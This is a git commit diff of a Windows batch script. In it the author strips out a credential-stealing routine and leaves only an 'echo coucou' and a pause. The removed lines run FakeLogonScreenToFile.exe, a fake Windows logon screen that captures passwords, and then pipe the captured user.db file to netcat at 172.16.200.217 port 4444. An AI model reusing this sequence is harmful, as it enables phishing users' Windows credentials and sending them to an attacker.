73c97c023f89a361799a620e31053930c65592d0
Adxmxx <adammenu@icloud.com>
2024-11-04 18:22:08 +0100

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,10 +1,4 @@
 @echo off
 
-if exist "%LOCALAPPDATA%\Microsoft\user.db" /a:hs (
-	del "%LOCALAPPDATA%\Microsoft\user.db" /a:hs
-
-)
-
-start /wait "" "C:\Users\%USERPROFILE%\Desktop\fakelogonscreen_trunk\FakeLogonScreenToFile.exe"
-type "%LOCALAPPDATA%\Microsoft\user.db" | nc 172.16.200.217 4444
- 
+echo coucou
+pause
